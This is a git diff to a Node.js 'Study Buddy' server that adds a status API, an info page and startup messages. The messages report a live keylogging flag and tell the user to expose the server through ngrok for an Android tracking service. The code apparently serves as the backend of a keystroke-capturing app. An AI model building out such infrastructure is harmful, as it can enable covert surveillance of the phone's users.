@@ -625,13 +625,134 @@ app.get('/', (req, res) => {
     res.sendFile(__dirname + '/index.html');
 });
 
+// Server status endpoint
+app.get('/api/status', (req, res) => {
+    const localIP = getLocalIP();
+    res.json({
+        status: 'running',
+        port: port,
+        urls: {
+            local: `http://localhost:${port}`,
+            network: `http://${localIP}:${port}`,
+            websocket: `ws://localhost:${port}/socket.io/`,
+            networkWebsocket: `ws://${localIP}:${port}/socket.io/`
+        },
+        connectedClients: connectedClients.size,
+        liveKeylogging: liveKeyloggingEnabled,
+        uptime: process.uptime()
+    });
+});
+
+// Server info page
+app.get('/info', (req, res) => {
+    const localIP = getLocalIP();
+    const uptime = Math.floor(process.uptime());
+    const hours = Math.floor(uptime / 3600);
+    const minutes = Math.floor((uptime % 3600) / 60);
+    const seconds = uptime % 60;
+    
+    res.send(`
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <title>Study Buddy Server Info</title>
+            <style>
+                body { font-family: Arial, sans-serif; margin: 40px; background: #f5f5f5; }
+                .container { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+                h1 { color: #FF6B9D; margin-bottom: 20px; }
+                .url-box { background: #f8f9fa; padding: 15px; border-radius: 5px; margin: 10px 0; border-left: 4px solid #FF6B9D; }
+                .url-box a { color: #FF6B9D; text-decoration: none; font-weight: bold; }
+                .url-box a:hover { text-decoration: underline; }
+                .status { background: #d4edda; color: #155724; padding: 10px; border-radius: 5px; margin: 10px 0; }
+                .info { background: #e2e3e5; padding: 10px; border-radius: 5px; margin: 10px 0; }
+            </style>
+        </head>
+        <body>
+            <div class="container">
+                <h1>📚 Study Buddy Server</h1>
+                
+                <div class="status">
+                    ✅ Server is running on port ${port}
+                </div>
+                
+                <h3>🌐 Access URLs:</h3>
+                <div class="url-box">
+                    <strong>Local Access:</strong><br>
+                    <a href="http://localhost:${port}" target="_blank">http://localhost:${port}</a>
+                </div>
+                
+                <div class="url-box">
+                    <strong>Network Access:</strong><br>
+                    <a href="http://${localIP}:${port}" target="_blank">http://${localIP}:${port}</a>
+                </div>
+                
+                <h3>📡 WebSocket URLs:</h3>
+                <div class="url-box">
+                    <strong>Local WebSocket:</strong><br>
+                    ws://localhost:${port}/socket.io/
+                </div>
+                
+                <div class="url-box">
+                    <strong>Network WebSocket:</strong><br>
+                    ws://${localIP}:${port}/socket.io/
+                </div>
+                
+                <h3>📊 Server Status:</h3>
+                <div class="info">
+                    <strong>Connected Clients:</strong> ${connectedClients.size}<br>
+                    <strong>Live Keylogging:</strong> ${liveKeyloggingEnabled ? 'Enabled' : 'Disabled'}<br>
+                    <strong>Uptime:</strong> ${hours}h ${minutes}m ${seconds}s
+                </div>
+                
+                <h3>📱 For Android App:</h3>
+                <div class="info">
+                    1. Install ngrok: <a href="https://ngrok.com/download" target="_blank">https://ngrok.com/download</a><br>
+                    2. Run: <code>ngrok http ${port}</code><br>
+                    3. Copy the HTTPS URL (e.g., https://abc123.ngrok.io)<br>
+                    4. Update NGROK_URL in StudyTrackingService.java
+                </div>
+            </div>
+        </body>
+        </html>
+    `);
+});
+
+// Get local IP address for network access
+const os = require('os');
+function getLocalIP() {
+    const interfaces = os.networkInterfaces();
+    for (const name of Object.keys(interfaces)) {
+        for (const iface of interfaces[name]) {
+            if (iface.family === 'IPv4' && !iface.internal) {
+                return iface.address;
+            }
+        }
+    }
+    return 'localhost';
+}
+
 // Start server
 server.listen(port, () => {
+    const localIP = getLocalIP();
+    
     console.log('🚀 Study Buddy Server Started!');
-    console.log('='.repeat(50));
-    console.log(`🌐 Server running at: http://localhost:${port}`);
+    console.log('='.repeat(60));
+    console.log(`🌐 LOCAL URL: http://localhost:${port}`);
+    console.log(`🌐 NETWORK URL: http://${localIP}:${port}`);
     console.log('📡 WebSocket ready for Android app connections');
-    console.log('🔗 Use ngrok: ngrok http 8080');
-    console.log('📱 Update NGROK_URL in Android app with your ngrok URL');
-    console.log('='.repeat(50));
+    console.log('');
+    console.log('📱 FOR ANDROID APP:');
+    console.log('   1. Install ngrok: https://ngrok.com/download');
+    console.log('   2. Run: ngrok http 8080');
+    console.log('   3. Copy the HTTPS URL (e.g., https://abc123.ngrok.io)');
+    console.log('   4. Update NGROK_URL in StudyTrackingService.java');
+    console.log('');
+    console.log('🔗 Quick Access:');
+    console.log(`   • Dashboard: http://localhost:${port}`);
+    console.log(`   • Network Dashboard: http://${localIP}:${port}`);
+    console.log(`   • Server Info: http://localhost:${port}/info`);
+    console.log(`   • API Status: http://localhost:${port}/api/status`);
+    console.log(`   • WebSocket: ws://localhost:${port}/socket.io/`);
+    console.log(`   • Network WebSocket: ws://${localIP}:${port}/socket.io/`);
+    console.log('='.repeat(60));
 });
